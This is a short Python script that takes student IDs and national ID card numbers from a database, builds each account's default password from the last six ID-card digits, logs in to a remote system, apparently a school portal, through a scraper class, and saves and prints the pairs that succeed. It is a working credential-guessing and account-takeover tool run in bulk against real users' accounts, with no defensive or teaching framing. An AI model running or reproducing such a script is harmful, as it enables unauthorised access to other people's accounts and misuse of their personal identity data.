from db import DB
from infoparser import InfoParser 
from verifyspider import VerifySpider


parser = InfoParser()
db = DB()
def do(sid,idcard):
    spider = VerifySpider()
    if idcard[-1] == 'X' or idcard[-1] == 'x':
        password = idcard[-7:-1]
    else:
        password = idcard[-6:]

    html = spider.req_login(sid,password)
    if parser.check_login(html):
        db.insert_info(sid,password)
        html = spider.req_info()
        online = parser.check_online(html)
        return online
    else:
        return False

def main():
    cur = db.get_info()
    i = 0
    for (sid,idcard) in cur:
        status = do(sid,idcard)
        if status:
            print(sid,idcard)
        i = i+1
        if i>200:
            break
    print('end')

if __name__ == '__main__':
    main()
